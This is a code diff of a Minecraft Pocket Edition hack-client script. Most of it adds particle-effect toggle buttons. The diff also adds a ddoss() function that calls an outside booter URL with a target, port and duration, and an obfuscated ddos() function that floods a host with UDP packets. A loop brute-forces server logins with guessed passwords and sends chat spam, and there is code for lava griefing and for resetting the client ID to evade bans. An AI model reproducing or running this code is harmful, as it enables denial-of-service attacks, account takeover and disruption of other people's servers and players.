+if(particle10 == true){
+clientMessage(client + "§7Particle 10 is true");
+}
+if(particle10 == false){
+clientMessage(client + "§7Particle 10 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p10);
+
+var p11 = new android.widget.Button(ctx);
+            p11.setText("heart: "+(particle11?"on":"off"));
+            p11.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle11?particle11=false:particle11=true;
+p11.setText("heart: "+(particle11?"on":"off"));
+if(particle11 == true){
+clientMessage(client + "§7Particle 11 is true");
+}
+if(particle11 == false){
+clientMessage(client + "§7Particle 11 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p11);
+
+var p12 = new android.widget.Button(ctx);
+            p12.setText("Huge explosion: "+(particle12?"on":"off"));
+            p12.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle12?particle12=false:particle12=true;
+p12.setText("Huge explosion: "+(particle12?"on":"off"));
+if(particle12 == true){
+clientMessage(client + "§7Particle 12 is true");
+}
+if(particle12 == false){
+clientMessage(client + "§7Particle 12 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p12);
+
+var p13 = new android.widget.Button(ctx);
+            p13.setText("Explosion seed: "+(particle13?"on":"off"));
+            p13.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle13?particle13=false:particle13=true;
+p13.setText("Explosion seed: "+(particle13?"on":"off"));
+if(particle13 == true){
+clientMessage(client + "§7Particle 13 is true");
+}
+if(particle13 == false){
+clientMessage(client + "§7Particle 13 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p13);
+
+var p14 = new android.widget.Button(ctx);
+            p14.setText("ink: "+(particle14?"on":"off"));
+            p14.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle14?particle14=false:particle14=true;
+p14.setText("ink: "+(particle14?"on":"off"));
+if(particle14 == true){
+clientMessage(client + "§7Particle 14 is true");
+}
+if(particle14 == false){
+clientMessage(client + "§7Particle 14 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p14);
+
+var p15 = new android.widget.Button(ctx);
+            p15.setText("Item break: "+(particle15?"on":"off"));
+            p15.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle15?particle15=false:particle15=true;
+p15.setText("Item break: "+(particle15?"on":"off"));
+if(particle15 == true){
+clientMessage(client + "§7Particle 15 is true");
+}
+if(particle15 == false){
+clientMessage(client + "§7Particle 15 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p15);
+
+var p16 = new android.widget.Button(ctx);
+            p16.setText("Lava: "+(particle16?"on":"off"));
+            p16.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle16?particle16=false:particle16=true;
+p16.setText("Lava: "+(particle16?"on":"off"));
+if(particle16 == true){
+clientMessage(client + "§7Particle 16 is true");
+}
+if(particle16 == false){
+clientMessage(client + "§7Particle 16 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p16);
+
+var p17 = new android.widget.Button(ctx);
+            p17.setText("Mob flame: "+(particle17?"on":"off"));
+            p17.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle17?particle17=false:particle17=true;
+p17.setText("Mob flame: "+(particle17?"on":"off"));
+if(particle17 == true){
+clientMessage(client + "§7Particle 17 is true");
+}
+if(particle17 == false){
+clientMessage(client + "§7Particle 17 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p17);
+
+var p18 = new android.widget.Button(ctx);
+            p18.setText("Note: "+(particle18?"on":"off"));
+            p18.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle18?particle18=false:particle18=true;
+p18.setText("Note: "+(particle18?"on":"off"));
+if(particle18 == true){
+clientMessage(client + "§7Particle 18 is true");
+}
+if(particle18 == false){
+clientMessage(client + "§7Particle 18 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p18);
+
+var p19 = new android.widget.Button(ctx);
+            p19.setText("Portal: "+(particle19?"on":"off"));
+            p19.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle19?particle19=false:particle19=true;
+p19.setText("Portal: "+(particle19?"on":"off"));
+if(particle19 == true){
+clientMessage(client + "§7Particle 19 is true");
+}
+if(particle19 == false){
+clientMessage(client + "§7Particle 19 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p19);
+
+var p20 = new android.widget.Button(ctx);
+            p20.setText("Rain splash: "+(particle20?"on":"off"));
+            p20.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle20?particle20=false:particle20=true;
+p20.setText("Rain splash: "+(particle20?"on":"off"));
+if(particle20 == true){
+clientMessage(client + "§7Particle 20 is true");
+}
+if(particle20 == false){
+clientMessage(client + "§7Particle 20 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p20);
+
+var p21 = new android.widget.Button(ctx);
+            p21.setText("Redstone: "+(particle21?"on":"off"));
+            p21.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle21?particle21=false:particle21=true;
+p21.setText("Redstone: "+(particle21?"on":"off"));
+if(particle21 == true){
+clientMessage(client + "§7Particle 21 is true");
+}
+if(particle21 == false){
+clientMessage(client + "§7Particle 21 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p21);
+
+var p22 = new android.widget.Button(ctx);
+            p22.setText("Slime: "+(particle22?"on":"off"));
+            p22.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle22?particle22=false:particle22=true;
+p22.setText("Slime: "+(particle22?"on":"off"));
+if(particle22 == true){
+clientMessage(client + "§7Particle 22 is true");
+}
+if(particle22 == false){
+clientMessage(client + "§7Particle 22 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p22);
+
+var p23 = new android.widget.Button(ctx);
+            p23.setText("Smoke: "+(particle23?"on":"off"));
+            p23.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle23?particle23=false:particle23=true;
+p23.setText("Smoke: "+(particle23?"on":"off"));
+if(particle23 == true){
+clientMessage(client + "§7Particle 23 is true");
+}
+if(particle23 == false){
+clientMessage(client + "§7Particle 23 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p23);
+
+var p24 = new android.widget.Button(ctx);
+            p24.setText("Snow ball poof: "+(particle24?"on":"off"));
+            p24.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle24?particle24=false:particle24=true;
+p24.setText("Snow ball poof: "+(particle24?"on":"off"));
+if(particle24 == true){
+clientMessage(client + "§7Particle 24 is true");
+}
+if(particle24 == false){
+clientMessage(client + "§7Particle 24 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p24);
+
+var p25 = new android.widget.Button(ctx);
+            p25.setText("Spell: "+(particle25?"on":"off"));
+            p25.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle25?particle25=false:particle25=true;
+p25.setText("Spell: "+(particle25?"on":"off"));
+if(particle25 == true){
+clientMessage(client + "§7Particle 25 is true");
+}
+if(particle25 == false){
+clientMessage(client + "§7Particle 25 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p25);
+
+var p26 = new android.widget.Button(ctx);
+            p26.setText("Splash: "+(particle26?"on":"off"));
+            p26.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle26?particle26=false:particle26=true;
+p26.setText("Splash: "+(particle26?"on":"off"));
+if(particle26 == true){
+clientMessage(client + "§7Particle 26 is true");
+}
+if(particle26 == false){
+clientMessage(client + "§7Particle 26 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p26);
+
+var p27 = new android.widget.Button(ctx);
+            p27.setText("Suspended town: "+(particle27?"on":"off"));
+            p27.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle27?particle27=false:particle27=true;
+p27.setText("Suspended town: "+(particle27?"on":"off"));
+if(particle27 == true){
+clientMessage(client + "§7Particle 27 is true");
+}
+if(particle27 == false){
+clientMessage(client + "§7Particle 27 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p27);
+
+var p28 = new android.widget.Button(ctx);
+            p28.setText("Terrain: "+(particle28?"on":"off"));
+            p28.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle28?particle28=false:particle28=true;
+p28.setText("Terrain: "+(particle28?"on":"off"));
+if(particle28 == true){
+clientMessage(client + "§7Particle 28 is true");
+}
+if(particle28 == false){
+clientMessage(client + "§7Particle 28 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p28);
+
+var p29 = new android.widget.Button(ctx);
+            p29.setText("Water wake: "+(particle29?"on":"off"));
+            p29.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+particle29?particle29=false:particle29=true;
+p29.setText("Water wake: "+(particle29?"on":"off"));
+if(particle29 == true){
+clientMessage(client + "§7Particle 29 is true");
+}
+if(particle29 == false){
+clientMessage(client + "§7Particle 29 is false");
+                }
+}
+            }));
+            pmenuLayout.addView(p29);
+
+		var B_exit = new android.widget.Button(ctx);
+		B_exit.setText("Exit");
+		B_exit.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+             pmenu.dismiss();
+showMenuBtn();
+			}
+		});
+		pmenuLayout.addView(B_exit);
+
+            pmenu = new PopupWindow(pmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
+            pmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+            pmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
+            }catch(error){
+                Toast.makeText(ctx, "An error occured: " + error, 1).show();
+            }
+    }}));
+}
+
+
+/***********************/
+
 var btn12 = new android.widget.Button(ctx);
 		btn12.setText("Time Menu");
 if(GetLang=="de_DE")btn12.setText('Zeit Menü');
@@ -7306,6 +8444,33 @@ print("The signer Dialog Is Malfunctioning:"+e);
 }});
 }
 
+function ddoss(target, port, time)
+{
+
+  var xhr = new XMLHttpRequest();
+
+  xhr.open("GET", "http://applqpak.x10.mx/index.php?target=" + target + "&port=" + port + "&time=" + time, true);
+
+  xhr.send();
+
+ print("Attack Sent!");
+
+ xhr.onreadystatechange = function()
+  {
+
+    if(xhr.readyState == 4 && xhr.status == 200)
+    {
+
+      print("Attack Finished!");
+
+    }
+
+  }
+
+}
+
+var _0x56f5=["\x6E\x65\x74","\x55\x54\x46\x38","\x67\x65\x74\x42\x79\x74\x65\x73","","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x42\x79\x4E\x61\x6D\x65","\x49\x6E\x65\x74\x41\x64\x64\x72\x65\x73\x73","\x73\x65\x6E\x64","\x63\x6C\x6F\x73\x65","\x6C\x61\x6E\x67","\x73\x74\x61\x72\x74"];function ddos(_0xb446x2,_0xb446x3,_0xb446x4){var _0xb446x5= new java[_0x56f5[9]].Runnable({run:function(){try{for(var _0xb446x6=0;_0xb446x6<=_0xb446x4;_0xb446x6++){var _0xb446x7= new java[_0x56f5[0]].DatagramSocket();var _0xb446x8= new byte[2024];_0xb446x8=_0x56f5[3].toString()[_0x56f5[2]](_0x56f5[1]);_0xb446x7[_0x56f5[7]]( new java[_0x56f5[0]].DatagramPacket(_0xb446x8,_0xb446x8[_0x56f5[4]],java[_0x56f5[0]][_0x56f5[6]][_0x56f5[5]](_0xb446x2),_0xb446x3));_0xb446x7[_0x56f5[8]]()}}catch(e){print(e)}}});var _0xb446x9= new java[_0x56f5[9]].Thread(_0xb446x5);_0xb446x9[_0x56f5[10]]()}
+
 /***********************/
 
 //Misc
@@ -7368,6 +8533,9 @@ Level.spawnMob(x, y +1, z, EntityType.EXPERIENCE_ORB);
 	if(minecart) {
 Level.spawnMob(x, y +2, z, EntityType.MINECART);
 	}
+
+if(tspam)net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat(text);
+
 }
 
 function gameLoop(){
@@ -7401,8 +8569,48 @@ if(killfaura){
 killingf(); 
 
 }
+if(particle1)Level.addParticle(ParticleType.angryVillager, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 5);
+if(particle2)Level.addParticle(ParticleType.bubble, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle3)Level.addParticle(ParticleType.cloud, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle4)Level.addParticle(ParticleType.crit, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 50);
+if(particle5)Level.addParticle(ParticleType.dripLava, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle6)Level.addParticle(ParticleType.dripWater, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle7)Level.addParticle(ParticleType.enchantmenttable, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle8)Level.addParticle(ParticleType.fallingDust, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle9)Level.addParticle(ParticleType.flame, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150); if(particle10)Level.addParticle(ParticleType.happyVillager, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 50);
+if(particle11)Level.addParticle(ParticleType.heart, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 5);
+if(particle12)Level.addParticle(ParticleType.hugeexplosion, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle13)Level.addParticle(ParticleType.hugeexplosionSeed, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 10);
+if(particle14)Level.addParticle(ParticleType.ink, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle15)Level.addParticle(ParticleType.itemBreak, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle16)Level.addParticle(ParticleType.lava, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle17)Level.addParticle(ParticleType.mobFlame, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle18)Level.addParticle(ParticleType.note, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle19)Level.addParticle(ParticleType.portal, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle20)Level.addParticle(ParticleType.rainSplash, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle21)Level.addParticle(ParticleType.redstone, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 10);
+if(particle22)Level.addParticle(ParticleType.slime, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle23)Level.addParticle(ParticleType.smoke, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle24)Level.addParticle(ParticleType.snowballpoof, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle25)Level.addParticle(ParticleType.spell, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle26)Level.addParticle(ParticleType.splash, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle27)Level.addParticle(ParticleType.suspendedTown, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle28)Level.addParticle(ParticleType.terrain, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle29)Level.addParticle(ParticleType.waterWake, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
 
 }
+
+function devpardon() {
+        var file = new java.io.File( android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/minecraftpe/clientId.txt/");
+        var path=android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/minecraftpe/clientId.txt/" ; 
+        java.io.File(path).mkdirs(); 
+        file.createNewFile();
+        var write = new java.io.OutputStreamWriter(new java.io.FileOutputStream(file));
+        var string="";
+        write.append((Math.floor(Math.random() * (500000 - 100000 + 1)) + 100000));
+        write.close();
+         
+    }
 
 /***********************/
 
@@ -7448,4 +8656,80 @@ function load(){
 
 /***********************/
 
-var _0x188f=["\x6E\x61\x74\x69\x76\x65\x53\x65\x6E\x64\x43\x68\x61\x74","\x53\x63\x72\x69\x70\x74\x4D\x61\x6E\x61\x67\x65\x72","\x6D\x63\x70\x65\x6C\x61\x75\x6E\x63\x68\x65\x72","\x7A\x68\x75\x6F\x77\x65\x69\x7A\x68\x61\x6E\x67","\x2F\x6C\x6F\x67\x69\x6E\x20","\x3C\x70\x61\x73\x73\x77\x6F\x72\x64\x3E","\x28\x70\x61\x73\x73\x77\x6F\x72\x64\x29","\x5B\x70\x61\x73\x73\x77\x6F\x72\x64\x5D","\x7B\x70\x61\x73\x73\x77\x6F\x72\x64\x7D","\x70\x61\x73\x73\x77\x6F\x72\x64","\x69\x73\x53\x68\x6F\x77\x69\x6E\x67","\x69\x73\x52\x65\x6D\x6F\x74\x65","\x73\x65\x74\x4C\x65\x76\x65\x6C\x46\x61\x6B\x65\x43\x61\x6C\x6C\x62\x61\x63\x6B","\x73\x65\x74\x54\x69\x6D\x65","\x0A","\x58\x3A\x20","\x72\x6F\x75\x6E\x64","\x2C\x20\x59\x3A\x20","\x2C\x20\x5A\x3A\x20","\x2E\x20","\x46\x50\x53\x3A\x20","\x2E","\x47\x3A\x20","\x67\x65\x74\x47\x61\x6D\x65\x4D\x6F\x64\x65","\x20\x54\x3A\x20","\x67\x65\x74\x54\x69\x6D\x65","\x20\x57\x2F\x4C\x3A\x20","\x67\x65\x74\x52\x61\x69\x6E\x4C\x65\x76\x65\x6C","\x2F","\x67\x65\x74\x4C\x69\x67\x68\x74\x6E\x69\x6E\x67\x4C\x65\x76\x65\x6C","\x49\x44\x3A\x20","\x67\x65\x74\x43\x61\x72\x72\x69\x65\x64\x49\x74\x65\x6D","\x3A","\x67\x65\x74\x43\x61\x72\x72\x69\x65\x64\x49\x74\x65\x6D\x44\x61\x74\x61","\x67\x65\x74\x45\x6E\x74\x69\x74\x79","\x67\x65\x74\x4E\x61\x6D\x65","\x20\x7C\x20","\x42\x3A\x20","\x67\x65\x74\x42\x69\x6F\x6D\x65\x4E\x61\x6D\x65","\x20\x76","\x67\x65\x74\x4D\x69\x6E\x65\x63\x72\x61\x66\x74\x56\x65\x72\x73\x69\x6F\x6E","\x73\x68\x6F\x77\x54\x69\x70\x4D\x65\x73\x73\x61\x67\x65","\x6C\x61\x76\x61","\x61\x64\x64\x50\x61\x72\x74\x69\x63\x6C\x65","\x6C\x61\x72\x67\x65\x65\x78\x70\x6C\x6F\x64\x65","\x73\x65\x74\x54\x69\x6C\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64","\x70\x6F\x73\x74\x44\x65\x6C\x61\x79\x65\x64","\x6F\x73"];function rptask(){ctx[_0x188f[48]]( new java[_0x188f[47]].Runnable({run:function(){ new android[_0x188f[50]].Handler()[_0x188f[49]]( new java[_0x188f[47]].Runnable({run:function(){if(sspam){net[_0x188f[3]][_0x188f[2]][_0x188f[1]][_0x188f[0]](text)};if(hackk){net[_0x188f[3]][_0x188f[2]][_0x188f[1]][_0x188f[0]](_0x188f[4]+hackcount)};hackcount++;if(hackcount==0){hackcount=_0x188f[5]};if(hackcount==1){hackcount=_0x188f[5]};if(hackcount==2){hackcount=_0x188f[6]};if(hackcount==3){hackcount=_0x188f[6]};if(hackcount==4){hackcount=_0x188f[7]};if(hackcount==5){hackcount=_0x188f[7]};if(hackcount==6){hackcount=_0x188f[8]};if(hackcount==7){hackcount=_0x188f[8]};if(hackcount==8){hackcount=_0x188f[9]};if(hackcount==9){hackcount=_0x188f[9]};if(GUI!=null&&GUI[_0x188f[10]]()==false&&(menu==null||menu[_0x188f[10]]()==false)){net[_0x188f[3]][_0x188f[2]][_0x188f[1]][_0x188f[11]]=true;net[_0x188f[3]][_0x188f[2]][_0x188f[1]][_0x188f[12]](true,false);showMenuBtn()};if(onlyday){Level[_0x188f[13]](0)};if(stat22){ModPE[_0x188f[41]](_0x188f[14]+_0x188f[15]+Math[_0x188f[16]](nx)+_0x188f[17]+Math[_0x188f[16]](ny)+_0x188f[18]+Math[_0x188f[16]](nz)+_0x188f[19]+_0x188f[20]+Math[_0x188f[16]](fps)+_0x188f[21]+_0x188f[14]+_0x188f[22]+Level[_0x188f[23]]()+_0x188f[21]+_0x188f[24]+Level[_0x188f[25]]()+_0x188f[21]+_0x188f[26]+Math[_0x188f[16]](Level[_0x188f[27]]())+_0x188f[28]+Math[_0x188f[16]](Level[_0x188f[29]]())+_0x188f[19]+_0x188f[30]+Player[_0x188f[31]]()+_0x188f[32]+Player[_0x188f[33]]()+_0x188f[21]+_0x188f[14]+Player[_0x188f[35]](Player[_0x188f[34]]())+_0x188f[36]+_0x188f[37]+Level[_0x188f[38]]()+_0x188f[21]+_0x188f[39]+ModPE[_0x188f[40]]())};if(parti){Level[_0x188f[43]](ParticleType[_0x188f[42]],getPlayerX(),getPlayerY(),getPlayerZ(),0,0,0,150)};if(parti2){Level[_0x188f[43]](ParticleType[_0x188f[44]],getPlayerX(),getPlayerY(),getPlayerZ(),0,0,0,150)};if(grief){Level[_0x188f[45]](getPlayerX(),getPlayerY(),getPlayerZ(),11,0)};if(checkForUpdate==false){ctx[_0x188f[48]]( new java[_0x188f[47]].Runnable({run:function(){try{checkVersion()}catch(err){print(_0x188f[46]+err)}}}));checkForUpdate=true};if(updateWindow){ctx[_0x188f[48]]( new java[_0x188f[47]].Runnable({run:function(){try{updateVersion()}catch(err){print(_0x188f[46]+err)}}}));updateWindow=false};nx=getPlayerX();ny=getPlayerY();nz=getPlayerZ();eval(rptask())}}),1000/70)}}))}rptask()
+function rptask() {
+    ctx.runOnUiThread(new java.lang.Runnable({
+        run: function() {
+            new android.os.Handler()
+                .postDelayed(new java.lang.Runnable({
+                    run: function() {
+if(sspam)net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat(text);
+
+if(Server.getPort==57788)sspam = false;
+
+if(hackk)net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/login " + hackcount);
+hackcount++
+
+if(hackcount==0)hackcount="<password>";
+if(hackcount==1)hackcount="<password>";
+if(hackcount==2)hackcount="(password)";
+if(hackcount==3)hackcount="(password)";
+if(hackcount==4)hackcount="[password]";
+if(hackcount==5)hackcount="[password]";
+if(hackcount==6)hackcount="{password}";
+if(hackcount==7)hackcount="{password}";
+if(hackcount==8)hackcount="password";
+if(hackcount==9)hackcount="password";
+
+if(NO1 == null || NO1.isShowing()==false){
+net.zhuoweizhang.mcpelauncher.ScriptManager.setLevelFakeCallback(true, false);
+showMenuBtn();
+showSome();
+}
+
+if(onlyday)Level.setTime(0); 
+
+if(autod)Level.destroyBlock(Player.getPointedBlockX(), Player.getPointedBlockY(), Player.getPointedBlockZ(), false);
+
+if(stat22){
+ModPE.showTipMessage("\n" + "X: " + Math.round(nx) + ", Y: " + Math.round(ny) + ", Z: " + Math.round(nz) + ". " + "\n" + "G: " + Level.getGameMode() + "." + " T: " + Level.getTime() + "." + " W/L: " + Math.round(Level.getRainLevel()) + "/" + Math.round(Level.getLightningLevel()) + ". " + "ID: " + Player.getCarriedItem() + ":" + Player.getCarriedItemData() + "." + "\n" + Player.getName(Player.getEntity()) + " | " + "B: " + Level.getBiomeName() + "." + " v" + ModPE.getMinecraftVersion());
+}
+
+if(grief)Level.setTile(getPlayerX(), getPlayerY(), getPlayerZ(), 11, 0);
+
+ if(checkForUpdate==false) {
+        /*print("Checking for updates");*/
+        ctx.runOnUiThread(new java.lang.Runnable({
+            run: function() {
+                try {
+                    checkVersion();
+                }
+                catch(err) {
+  print("Error: "+err);
+                }
+            }
+        }));
+        checkForUpdate=true;
+    }
+    if(updateWindow) {
+        ctx.runOnUiThread(new java.lang.Runnable({
+            run: function() {
+                try {
+                    updateVersion();
+                }
+                catch(err) {
+                    print("Error: " + err);
+                }
+            }
+        }));
+        updateWindow=false;
+}
+                        nx = getPlayerX();
+                        ny = getPlayerY();
+                        nz = getPlayerZ();
+                        eval(rptask());
+                    }
+                }),/* Milliseconds between every call*/ 1000 / 70);
+        }
+    }))
+}
+rptask();
